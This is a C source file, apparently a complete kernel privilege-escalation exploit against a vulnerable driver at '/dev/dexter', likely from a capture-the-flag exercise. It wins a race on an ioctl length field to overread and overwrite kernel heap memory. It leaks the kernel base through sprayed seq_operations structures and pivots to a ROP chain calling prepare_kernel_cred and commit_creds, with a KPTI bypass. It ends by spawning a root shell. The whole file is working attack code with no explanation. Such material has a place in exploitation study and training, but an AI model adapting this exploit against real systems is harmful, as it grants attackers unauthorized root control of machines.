#include <stddef.h>
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/timerfd.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>

#define DEV_PATH "/dev/dexter"
#define ulong unsigned long
#define uint unsigned int
#define scu static const unsigned long

ulong kbase;
ulong user_cs,user_ss,user_rsp,user_rflags;

int fd;

#define MMAP_ADDR 0xf6000000
#define CMD_GET 0xdec50001
#define CMD_SET 0xdec50002

typedef struct {
  char *ptr;
  size_t len;
} request_t;

request_t req;

void fatal(char *msg){
  printf("[!] Err: %s\n", msg);
  exit(-1);
}

void root_shell(void) {
  puts("[+] spawning root shell...");
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

/* dexter module functions */
int dexter_getdata(char *data, size_t len) {
  req.ptr = data;
  req.len = len;
  return ioctl(fd, CMD_GET, &req);
}

int dexter_setdata(char *dst, size_t len) {
  req.ptr = dst;
  req.len = len;
  return ioctl(fd, CMD_SET, &req);
}

/* race condition */
int race_win = 0;

void *race(void *arg) {
  while (!race_win) {
    req.len = (size_t)arg;
    usleep(1);
  }
  return NULL;
}

/* primitive overread & overwrite */
void overread(char *buf, size_t len) {
  char *zero = (char*)malloc(len);
  pthread_t th;
  pthread_create(&th, NULL, race, (void*)len);

  memset(buf, 0, len);
  memset(zero, 0, len);
  while (!race_win) {
    dexter_getdata(buf, 0x20);
    if (memcmp(buf, zero, len) != 0) {
      race_win = 1;
      break;
    }
  }

  pthread_join(th, NULL);
  race_win = 0;
  free(zero);
}

void overwrite(char *buf, size_t len) {
  pthread_t th;
  char *tmp = (char*)malloc(len);

  while (1) {
    pthread_create(&th, NULL, race, (void*)len);
    for (int i=0; i < 0x10000; i++) dexter_setdata(buf, 0x20);
    race_win = 1;
    pthread_join(th, NULL);
    race_win = 0;
    overread(tmp, len);
    if (memcmp(tmp, buf, len) == 0) break;
  }

  free(tmp);
}


int main() {
  save_state();
  // heap spray
  int spray[0x40 * 2];
  for(int i=0; i < 0x40; i++) spray[i] = open("/proc/self/stat", O_RDONLY);
  fd = open(DEV_PATH, O_RDWR);
  if (fd == -1) fatal(DEV_PATH);
  for(int i=0x40; i < 0x80; i++) spray[i] = open("/proc/self/stat", O_RDONLY);

  // leak seq_operations.start
  char buf[0x100] = {0};
  overread(buf, sizeof(buf));
  /*
  for (int i=0; i < 0x100; i+=0x8) {
    printf("[+0x%x] 0x%016lx\n", i, *(ulong*)&buf[i]);
  }
  */
  ulong seq_operations_start = *(ulong*)&buf[0x20];
  printf("[i] seq_operations.start: 0x%016lx\n", seq_operations_start);
  kbase = seq_operations_start - 0x170f80;
  printf("[i] kbase: 0x%016lx\n", kbase);

  // mapping krop in UserLand
  void *ptr = mmap((void*)(MMAP_ADDR - 0x2000), 0x10000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED|MAP_POPULATE, -1, 0);
  if (ptr == MAP_FAILED) fatal("mmap");

  ulong commit_creds = kbase + 0x72810;
  ulong prepare_kernel_cred = kbase + 0x729b0;
  ulong bypass_kpti = kbase + 0x800e26;
  ulong rop_pop_rdi = kbase + 0x29033c;
  ulong rop_pop_rcx = kbase + 0x10d88b;
  ulong rop_mov_rdi_rax_rep_rdi_rsi = kbase + 0x63d0ab;
  ulong *chain = (ulong*)MMAP_ADDR;
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_rdi_rsi;
  *chain++ = commit_creds;
  *chain++ = bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&root_shell;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  // overwrite seq_operations.start -> krop
  ulong rop_mov_esp_f6000000h = kbase + 0x520224;
  *(ulong*)&buf[0x20] = rop_mov_esp_f6000000h;
  puts("[+] overwrite seq_operations.start");
  overwrite(buf, 0x28);
  for(int i=0; i < 0x80; i++) read(spray[i], buf,0x20);

  close(fd);
  return 0;
}
